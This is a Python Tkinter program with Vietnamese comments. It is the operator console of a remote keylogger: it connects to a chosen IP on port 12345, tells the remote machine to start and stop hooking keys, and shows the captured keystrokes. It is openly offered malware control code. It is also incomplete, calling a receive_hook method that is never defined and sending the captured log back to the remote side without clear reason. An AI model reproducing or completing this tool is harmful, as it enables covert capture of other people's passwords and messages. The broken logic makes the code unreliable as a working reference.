import tkinter as tk
from tkinter import Button, Text, Entry, messagebox
import socket

class KeyLoggerApp:
    def __init__(self):
        self.HookClicked = False
        self.UnhookClicked = False
        self.keylogger = ''
        self.client = None

        self.create_ui()

    def create_ui(self):
        self.root = tk.Tk()
        self.root.title("Keylogger")
        self.root.geometry("425x320")
        self.root.resizable(False, False)

        self.ip_entry_label = tk.Label(self.root, text="Enter Server IP:")
        self.ip_entry_label.grid(row=0, column=0, padx=10, pady=10)

        self.ip_entry = Entry(self.root)
        self.ip_entry.grid(row=0, column=1, padx=10, pady=10)

        connect_button = Button(self.root, text="Connect", command=self.connect_to_server)
        connect_button.grid(row=0, column=2, padx=10, pady=10)

        self.tab = Text(self.root, width=50, height=15)
        self.tab.grid(row=3, column=0, columnspan=4)

        hook_button = self.create_button("Hook", self.hook_key)
        unhook_button = self.create_button("Unhook", self.unhook_key)
        print_button = self.create_button("Print", self.print_key)
        delete_button = self.create_button("Delete", self.delete_key)

        hook_button.grid(row=1, column=0, sticky="e")
        unhook_button.grid(row=1, column=1, sticky="e")
        print_button.grid(row=1, column=2, sticky="e")
        delete_button.grid(row=1, column=3, sticky="e")

        self.root.mainloop()

    def create_button(self, text, command):
        button = Button(self.root, text=text, font="Helvetica 10 bold", width=6,
                        command=command)
        return button

    def connect_to_server(self):
        server_ip = self.ip_entry.get()
        if server_ip:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                self.client.connect((server_ip, 12345))
            except Exception as e:
                messagebox.showwarning("Connection Error", str(e))
        else:
            messagebox.showwarning("Input Error", "Please enter the Server IP.")

    # Các hàm xử lý HookKey, UnhookKey, PrintKey và DeleteKey tương tự như trong mã ban đầu

    def hook_key(self):
        if self.HookClicked:
            return
        self.HookClicked = True
        self.UnhookClicked = False
        self.client.sendall(bytes("HookKey", "utf-8"))
        checkdata = self.client.recv(1024).decode("utf-8")

    def unhook_key(self):
        if self.HookClicked:
            self.client.sendall(bytes("UnhookKey", "utf-8"))
            self.keylogger = self.receive_hook()
            self.client.sendall(bytes(self.keylogger, "utf-8"))
            self.UnhookClicked = True
            self.HookClicked = False

    def print_key(self):
        if not self.UnhookClicked:
            self.client.sendall(bytes("UnhookKey", "utf-8"))
            self.keylogger = self.receive_hook()
        self.tab.delete(1.0, tk.END)
        self.tab.insert(tk.END, self.keylogger)
        self.UnhookClicked = True
        self.HookClicked = False

    def delete_key(self):
        self.tab.delete(1.0, tk.END)


# Khởi tạo ứng dụng KeyLoggerApp
key_logger_app = KeyLoggerApp()
